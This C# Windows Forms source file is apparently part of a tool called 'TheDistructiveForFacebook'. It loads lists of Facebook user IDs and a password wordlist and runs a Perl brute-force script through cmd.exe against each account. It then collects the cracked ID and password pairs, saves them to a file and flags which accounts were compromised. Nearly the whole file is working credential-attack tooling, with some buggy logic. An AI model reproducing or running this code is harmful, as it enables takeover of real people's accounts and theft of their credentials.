using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
namespace TheDistructiveForFacebook.Forms.Controls
{
    public partial class BruterIDs : UserControl
    {
        public BruterIDs()
        {
            InitializeComponent();
        }
        static bool state;

        // My WORK
        private void StartBTN_Click(object sender, EventArgs e)
        {

            backgroundWorker1.RunWorkerAsync();

         }


        private void StopBTN_Click(object sender, EventArgs e)
        {
            state = false;
        }


        //  CHOOSE METHOD
        private void ChooseIDsBTN_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            string Line="";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                // Check File

                string FilePath = ofd.FileName;
                if (FilePath.IndexOf(".txt")== -1) FilePath += ".txt";
                // Write Path

                textIDs.Text = FilePath;
                StreamReader sr = new StreamReader(FilePath);
                listIDs.Items.Clear();

                while (Line != null)
                {
                    Line = sr.ReadLine();
                    if (Line == null)
                    {
                        ShowPro.Text = "0 Of " + listIDs.Items.Count;
                        textEnd.Text = listIDs.Items.Count.ToString();
                        sr.Close();
                        progressIDs.Maximum = listIDs.Items.Count;
                        return;
                    }
                    listIDs.Items.Add(Line);
                    Application.DoEvents();
                }
                sr.Close();
            }

        }

        private void ChoosePasswordBTN_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            //ofd.Filter = "Text|.txt";
            Form Frm = new Form();
            Frm.Size = new Size(300, 200);
            Frm.Font = new Font("Cairo",8,FontStyle.Regular);
            Frm.StartPosition = FormStartPosition.CenterScreen;
            ListBox List = new ListBox();
            Frm.Controls.Add(List);
            List.Dock = DockStyle.Fill;
            string Line = "";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                // Check File
                string FilePath = ofd.FileName;
                if (FilePath.IndexOf(".txt") == -1) FilePath += ".txt";
                // Write Path
                textPasswordsList.Text = FilePath;

                StreamReader sr = new StreamReader(FilePath);
                List.Items.Clear();

                while (Line != null)
                {
                    Line = sr.ReadLine();
                    if (Line == null)
                    {
                        sr.Close();
                        Frm.Show();
                        return;
                    }
                    List.Items.Add(Line);
                    Application.DoEvents();
                }
              
                sr.Close();
            }
        }

        // TITLE BAR
        private void ClearBTN_Click(object sender, EventArgs e)
        {
            listPasswords.Items.Clear();
        }

        private void SaveBTN_Click(object sender, EventArgs e)
        {
            // Preparing File To Save
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "File.txt";
            sfd.Filter = "Text|.txt";
           

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                // Check File
                string FilePath = sfd.FileName;
                if (FilePath.IndexOf(".txt") == -1) FilePath += ".txt";
                // Open Stream Writer
                System.IO.StreamWriter sw = new System.IO.StreamWriter(FilePath);

                // Write IDs
                for (int item = 0; item <= listPasswords.Items.Count - 1; item++)
                {

                    sw.WriteLine(listPasswords.Items[item].SubItems[0].Text + "," + listPasswords.Items[item].SubItems[1].Text);
                    Application.DoEvents();
                }
                // Close Stream Writer
                sw.Close();

            }
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

            this.Invoke(new Action(() =>
            {
                if (textPasswordsList.Text != "" && listIDs.Items.Count > 0)
                {
                    state = true;

                    for (int item = Convert.ToInt32(textStart.Text); item <= Convert.ToInt32(textEnd.Text) -1; item++)
                    {
                        if (state == true)
                        {
                            Process cmd = new Process();

                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.RedirectStandardInput = true;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.CreateNoWindow = true;
                            cmd.StartInfo.UseShellExecute = false;
                            cmd.Start();

                            listIDs.SetSelected(item, true);
                            progressIDs.Value = item;
                            ShowPro.Text = item.ToString() + " Of " + listIDs.Items.Count.ToString() + " : " + listPasswords.Items.Count.ToString();

                            cmd.StandardInput.WriteLine("cd C:\\ & Facebook.pl " + listIDs.SelectedItem.ToString() + " " + textPasswordsList.Text);
                            cmd.StandardInput.Flush();
                            cmd.StandardInput.Close();
                            cmd.WaitForExit();
                            string OutIDs = cmd.StandardOutput.ReadToEnd();

                            progressIDs.Value = listIDs.Items.Count;
                            if (OutIDs.IndexOf("Password Cracked:") > -1)
                            {

                                string Password = OutIDs.Substring(OutIDs.IndexOf("Password Cracked:")) + 17;
                                listPasswords.Items.Add(listIDs.SelectedItem.ToString()).SubItems.Add((Password.Substring(0, Password.IndexOf("[1;32m"))).Replace("Password Cracked:", ""));
                            }
                            Application.DoEvents();
                        }
                        else
                        {
                            return;
                        }


                    }
                }
                progressIDs.Value = progressIDs.Maximum;
                ShowPro.Text = listIDs.Items.Count.ToString() +" Of " + listIDs.Items.Count.ToString();
            }));
        }
        private void testPasswordToolStripMenuItem_Click(object sender, EventArgs e)
        {

            string ID = listPasswords.Items[Convert.ToInt16(listPasswords.SelectedIndices[0].ToString())].Text;
            string strCmdText = "/C cd C:\\ & perl Facebook.pl " + ID + " "  + textPasswordsList.Text  +  " & ping www.google.com -t " ;
            System.Diagnostics.Process.Start("CMD.exe", strCmdText);
        }


        private void removeIDsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listPasswords.Items[Convert.ToInt16(listPasswords.SelectedIndices[0].ToString())].Remove();
        }

        private void checkAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            progressIDs.Maximum = listPasswords.Items.Count;
            int GreenAccount = 0;
            for (int item = 0; item <= listPasswords.Items.Count - 1; item++)
            {

                Process cmd = new Process();

                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();

                string ID = listPasswords.Items[item].Text;
                progressIDs.Value = item;
                ShowPro.Text = item.ToString() + " Of " + listPasswords.Items.Count.ToString();

                cmd.StandardInput.WriteLine("cd C:\\ & Facebook.pl " + ID + " " + textPasswordsList.Text);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                string OutIDs = cmd.StandardOutput.ReadToEnd();

                progressIDs.Value = item;
                if (OutIDs.IndexOf("Password Cracked:") > -1)
                {
                    listPasswords.Items[item].ForeColor = Color.Green;
                    GreenAccount++;
                }
                else
                {
                    listPasswords.Items[item].ForeColor = Color.Black;
                }
                Application.DoEvents();

            }
            progressIDs.Value = progressIDs.Maximum;
            ShowPro.Text = listPasswords.Items.Count.ToString() + " Of " + listPasswords.Items.Count.ToString();
            MessageBox.Show("Green Account : " + GreenAccount.ToString() + " But Black : " + (listPasswords.Items.Count - GreenAccount).ToString());
        }


        private void openIDToolStripMenuItem_Click(object sender, EventArgs e)
        {
             string ID = listPasswords.Items[Convert.ToInt16(listPasswords.SelectedIndices[0].ToString())].Text;
             System.Diagnostics.Process.Start("www.facebook.com\\profile.php?id=" + ID);
        }

        private void clearBlackIDsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int Count = listPasswords.Items.Count - 1;
            try 
            {
                for (int x = 0; x >= Count; x++)
                {
                    if (listPasswords.Items[x].ForeColor == Color.Black)
                    {
                        MessageBox.Show(listPasswords.Items[x].ForeColor.ToString());
                        listPasswords.Items[x].Remove();
                        Count = listPasswords.Items.Count - 1;
                    }
                }
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }
    }
}
